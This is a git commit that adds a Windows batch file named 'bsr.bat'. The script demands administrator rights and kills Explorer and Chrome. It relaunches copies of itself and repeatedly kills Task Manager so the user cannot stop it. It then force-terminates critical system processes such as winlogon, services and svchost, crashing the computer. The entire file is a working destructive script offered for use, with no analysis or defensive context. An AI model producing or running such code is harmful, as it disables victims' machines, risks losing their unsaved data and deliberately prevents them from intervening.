fd2c69289e30dfcff68f9e899e0ef5002c7aa380
Artucuno1234 <Articuno1234@users.noreply.github.com>
2019-03-21 21:11:18 +1100

    bsr

---
+++ bsr.bat
@@ -0,0 +1,96 @@
+@echo off
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    goto run
+) else (
+    echo Please run as admin!
+	pause
+	exit
+)
+
+:run
+taskkill /f /im explorer.exe
+
+
+echo.
+echo bbbbbbbb                                                 
+echo b::::::b                                                 
+echo b::::::b                                                 
+echo b::::::b                                                 
+echo  b:::::b                                                 
+echo  b:::::bbbbbbbbb        ssssssssss   rrrrr   rrrrrrrrr   
+echo  b::::::::::::::bb    ss::::::::::s  r::::rrr:::::::::r  
+echo  b::::::::::::::::b ss:::::::::::::s r:::::::::::::::::r 
+echo  b:::::bbbbb:::::::bs::::::ssss:::::srr::::::rrrrr::::::r
+echo  b:::::b    b::::::b s:::::s  ssssss  r:::::r     r:::::r
+echo  b:::::b     b:::::b   s::::::s       r:::::r     rrrrrrr
+echo  b:::::b     b:::::b      s::::::s    r:::::r            
+echo  b:::::b     b:::::bssssss   s:::::s  r:::::r            
+echo  b:::::bbbbbb::::::bs:::::ssss::::::s r:::::r            
+echo  b::::::::::::::::b s::::::::::::::s  r:::::r            
+echo  b:::::::::::::::b   s:::::::::::ss   r:::::r            
+echo  bbbbbbbbbbbbbbbb     sssssssssss     rrrrrrr            
+echo.                                                                  
+echo.
+echo bsr running in admin
+ping localhost -n 3 >nul
+START /MIN CMD.EXE /C %0
+taskkill /f /im chrome.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+START /MIN CMD.EXE /C %0
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+echo GET READY
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+ping localhost -n 3 >nul
+taskkill /f /im taskmgr.exe
+taskkill /f /im System.exe
+taskkill /f /im services.exe
+taskkill /f /im winlogon.exe
+taskkill /f /im svchost.exe
+taskkill /f /im rundll32.exe
+
+
